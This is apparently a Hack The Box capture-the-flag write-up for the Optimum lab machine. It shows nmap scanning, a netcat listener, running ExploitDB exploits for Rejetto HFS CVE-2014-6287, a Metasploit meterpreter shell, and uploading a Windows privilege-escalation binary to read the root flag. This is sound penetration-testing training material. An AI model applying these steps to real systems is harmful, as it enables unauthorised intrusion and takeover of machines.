---
layout: default
title: OPTIMUM
description: by Hack The Box
---

<h3 align="center">
Optimum is a machine that has the Rejetto HttpFileServer vulnerability CVE-2014-6287
</h3>

# Enumeration

1. Scan with nmap

   ```
   └─$ nmap -T4 10.10.10.8 -A -Pn --script vuln
   Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-27 21:25 EST
   Pre-scan script results:
   | broadcast-avahi-dos:
   |   Discovered hosts:
   |     224.0.0.251
   |   After NULL UDP avahi packet DoS (CVE-2011-1002).
   |_  Hosts are all up (not vulnerable).
   Nmap scan report for 10.10.10.8
   Host is up (0.034s latency).
   Not shown: 999 filtered tcp ports (no-response)
   PORT   STATE SERVICE VERSION
   80/tcp open  http    HttpFileServer httpd 2.3
   | vulners:
   |   cpe:/a:rejetto:httpfileserver:2.3:
   |       1337DAY-ID-35849        10.0    https://vulners.com/zdt/1337DAY-ID-35849        *EXPLOIT*
   |       SECURITYVULNS:VULN:14023        7.5     https://vulners.com/securityvulns/SECURITYVULNS:VULN:14023
   |       PACKETSTORM:161503      7.5     https://vulners.com/packetstorm/PACKETSTORM:161503      *EXPLOIT*
   |       PACKETSTORM:160264      7.5     https://vulners.com/packetstorm/PACKETSTORM:160264      *EXPLOIT*
   |       PACKETSTORM:135122      7.5     https://vulners.com/packetstorm/PACKETSTORM:135122      *EXPLOIT*
   |       PACKETSTORM:128593      7.5     https://vulners.com/packetstorm/PACKETSTORM:128593      *EXPLOIT*
   |       PACKETSTORM:128243      7.5     https://vulners.com/packetstorm/PACKETSTORM:128243      *EXPLOIT*
   |       MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC       7.5     https://vulners.com/metasploit/MSF:EXPLOIT/WINDOWS/HTTP/REJETTO_HFS_EXEC        *EXPLOIT*
   |       EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13    7.5     https://vulners.com/exploitpack/EXPLOITPACK:A6E51CB06A5AB6562CC6D5A235ECDE13    *EXPLOIT*
   |       EXPLOITPACK:A39709063C426496F984E8852560BBFF    7.5     https://vulners.com/exploitpack/EXPLOITPACK:A39709063C426496F984E8852560BBFF    *EXPLOIT*
   |       EDB-ID:49584    7.5     https://vulners.com/exploitdb/EDB-ID:49584      *EXPLOIT*
   |       EDB-ID:49125    7.5     https://vulners.com/exploitdb/EDB-ID:49125      *EXPLOIT*
   |       EDB-ID:39161    7.5     https://vulners.com/exploitdb/EDB-ID:39161      *EXPLOIT*
   |       EDB-ID:34926    7.5     https://vulners.com/exploitdb/EDB-ID:34926      *EXPLOIT*
   |       EDB-ID:34668    7.5     https://vulners.com/exploitdb/EDB-ID:34668      *EXPLOIT*
   |       1337DAY-ID-25379        7.5     https://vulners.com/zdt/1337DAY-ID-25379        *EXPLOIT*
   |       1337DAY-ID-22733        7.5     https://vulners.com/zdt/1337DAY-ID-22733        *EXPLOIT*
   |       1337DAY-ID-22640        7.5     https://vulners.com/zdt/1337DAY-ID-22640        *EXPLOIT*
   |_      1337DAY-ID-6287 0.0     https://vulners.com/zdt/1337DAY-ID-6287 *EXPLOIT*
   |_http-server-header: HFS 2.3
   |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
   | http-method-tamper:
   |   VULNERABLE:
   |   Authentication bypass by HTTP verb tampering
   |     State: VULNERABLE (Exploitable)
   |       This web server contains password protected resources vulnerable to authentication bypass
   |       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
   |        common HTTP methods and in misconfigured .htaccess files.
   |
   |     Extra information:
   |
   |   URIs suspected to be vulnerable to HTTP verb tampering:
   |     /~login [GENERIC]
   |
   |     References:
   |       http://capec.mitre.org/data/definitions/274.html
   |       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
   |       http://www.mkit.com.ar/labs/htexploit/
   |_      http://www.imperva.com/resources/glossary/http_verb_tampering.html
   | http-vuln-cve2011-3192:
   |   VULNERABLE:
   |   Apache byterange filter DoS
   |     State: VULNERABLE
   |     IDs:  CVE:CVE-2011-3192  BID:49303
   |       The Apache web server is vulnerable to a denial of service attack when numerous
   |       overlapping byte ranges are requested.
   |     Disclosure date: 2011-08-19
   |     References:
   |       https://www.tenable.com/plugins/nessus/55976
   |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3192
   |       https://www.securityfocus.com/bid/49303
   |_      https://seclists.org/fulldisclosure/2011/Aug/175
   |_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
   | http-fileupload-exploiter:
   |
   |_    Couldn't find a file-type field.
   |_http-csrf: Couldn't find any CSRF vulnerabilities.
   |_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
   |_http-dombased-xss: Couldn't find any DOM based XSS.
   Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

   Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
   Nmap done: 1 IP address (1 host up) scanned in 248.59 seconds
   ```

2. Only one port open, Rejetto HttpFileServer 2.3... from the looks of it our VULN script found a few hits this one too. Let's google dork the hell out of this vulnerability.
3. ExploitDB has something juicy. CVE-2014-6287.

# FootHold

4. Let's download the exploit and run it. Had to change the IP address and port inside the python exploit we've download first using gedit.
5. Now let's start a listener
   ```
   nc -nvlp 4444
   ```
6. And let's run the exploit
   ```
   python 39161.py 10.10.10.8 80
   ```
7. For some reason I cant make it work, I can't get the shell to open from my listener.
8. Pivoting to MSFCONSOLE. We'll search for REJETTO and there is only one result from this one.
9. Set RHOSTS and LHOST, and after some time we get our meterpreter shell.
10. From here we can get the user flag.

# PrivEsc to ROOT

11. We invoke the `sysinfo` command in the meterpreter shell so that we can enumerate the machine further and we found these details
    ```
    meterpreter > sysinfo
    Computer        : OPTIMUM
    OS              : Windows 2012 R2 (6.3 Build 9600).
    Architecture    : x64
    System Language : el_GR
    Domain          : HTB
    Logged On Users : 1
    Meterpreter     : x86/windows
    ```
12. Googling for exploit on the OS and its version we found 39719 from ExplotDB but me introduce you guys to a new methodology that I learned in this machine from reading other write-ups. The gist of it is, we can download the sysinfo of this machine and then download the python script the matches the systeminfo of the machine to known vulnerabilities that we can try.
13. First let's download the systeminfo from our meterpreter shell.

    first

    ```
    meterpreter > execute -f "cmd.exe /c systeminfo > systeminfo.txt"
    ```

    then

    ```
    meterpreter > download systeminfo.txt

    [*] Downloading: systeminfo.txt -> /home/schoon3r/HTB/systeminfo.txt
    [*] Downloaded 3.26 KiB of 3.26 KiB (100.0%): systeminfo.txt -> /home/schoon3r/HTB/systeminfo.txt
    [*] download   : systeminfo.txt -> /home/schoon3r/HTB/systeminfo.txt
    ```

14. Now that we have systeminfo details. Let's grab the python script I mentioned that find vulns for this type of system.

    Download the script

    ```
    git clone https://github.com/GDSSecurity/Windows-Exploit-Suggester.git

    Cloning into 'Windows-Exploit-Suggester'...
    remote: Enumerating objects: 120, done.
    remote: Total 120 (delta 0), reused 0 (delta 0), pack-reused 120
    Receiving objects: 100% (120/120), 169.26 KiB | 849.00 KiB/s, done.
    Resolving deltas: 100% (72/72), done.
    ```

    Let's just do a bit of housekeeping and update this script

    ```
    cd Windows-Exploit-Suggester

    python2 windows-exploit-suggester.py --update
    ```

    Now, let's feed in that systeminfo that we downloaded into this script and let's see the output

    ```
    python2 windows-exploit-suggester.py --database 2021-11-27-mssb.xls --systeminfo systeminfo.txt --quiet
    ```

    EXTRA!!!!

    I had an error saying `[-] please install and upgrade the python-xlrd library`. In case you get this too... here is how I fixed it.

    ```
    wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
    ```

    ```
    python get-pip.py
    ```

    ```
    python -m pip install --user xlrd==1.1.0
    ```

    After this, everything went well. Last thing... make sure (1) the database has the correct filename (2) the path of your systeminfo.txt is correct. Here is the output I got.

    ```
    └─# python2 windows-exploit-suggester.py --database 2021-11-27-mssb.xls --systeminfo systeminfo.txt --quiet

    [*] initiating winsploit version 3.3...
    [*] database file detected as xls or xlsx based on extension
    [*] attempting to read from the systeminfo input file
    [+] systeminfo input file read successfully (ISO-8859-1)
    [*] querying database file for potential vulnerabilities
    [*] comparing the 32 hotfix(es) against the 266 potential bulletins(s) with a database of 137 known exploits
    [*] there are now 246 remaining vulns
    [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
    [+] windows version identified as 'Windows 2012 R2 64-bit'
    [*]
    [E] MS16-135: Security Update for Windows Kernel-Mode Drivers (3199135) - Important
    [E] MS16-098: Security Update for Windows Kernel-Mode Drivers (3178466) - Important
    [M] MS16-075: Security Update for Windows SMB Server (3164038) - Important
    [E] MS16-074: Security Update for Microsoft Graphics Component (3164036) - Important
    [E] MS16-063: Cumulative Security Update for Internet Explorer (3163649) - Critical
    [E] MS16-032: Security Update for Secondary Logon to Address Elevation of Privile (3143141) - Important
    [M] MS16-016: Security Update for WebDAV to Address Elevation of Privilege (3136041) - Important
    [E] MS16-014: Security Update for Microsoft Windows to Address Remote Code Execution (3134228) - Important
    [E] MS16-007: Security Update for Microsoft Windows to Address Remote Code Execution (3124901) - Important
    [E] MS15-132: Security Update for Microsoft Windows to Address Remote Code Execution (3116162) - Important
    [E] MS15-112: Cumulative Security Update for Internet Explorer (3104517) - Critical
    [E] MS15-111: Security Update for Windows Kernel to Address Elevation of Privilege (3096447) - Important
    [E] MS15-102: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege (3089657) - Important
    [E] MS15-097: Vulnerabilities in Microsoft Graphics Component Could Allow Remote Code Execution (3089656) - Critical
    [M] MS15-078: Vulnerability in Microsoft Font Driver Could Allow Remote Code Execution (3079904) - Critical
    [E] MS15-052: Vulnerability in Windows Kernel Could Allow Security Feature Bypass (3050514) - Important
    [M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important
    [E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
    [E] MS15-001: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege (3023266) - Important
    [E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical
    [M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical
    [M] MS14-060: Vulnerability in Windows OLE Could Allow Remote Code Execution (3000869) - Important
    [M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
    [E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important
    [M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
    ```

15. So there a few here that will work and more that won't you can try them out one by one but I will let you know that MS16-098 will work and so does MS16-032. Those ar the ones that I've tried.
16. Let's run the 2nd option MS16-095. Go to the ExploitDB website https://www.exploit-db.com/exploits/41020 and download the binary executable.
17. Let's upload that in our meterpreter shell

    ```
    upload 41020.exe
    ```

    then let's try a shell so it's easier to see things

    ```
    shell
    ```

    Great! Now let's execute that payload

    ```
    41020.exe
    ```

    Let's try if it worked

    ```
    cd C:\Users\Administrator\Desktop
    ```

    Yahoo!

    ```
    C:\Users\Administrator\Desktop>type root.txt

    type root.txt
    51ed1b36553c8461f4552c2e92b3eeed
    ```

<br><br>

# Reference

<br><br>

[back to HOME](./)
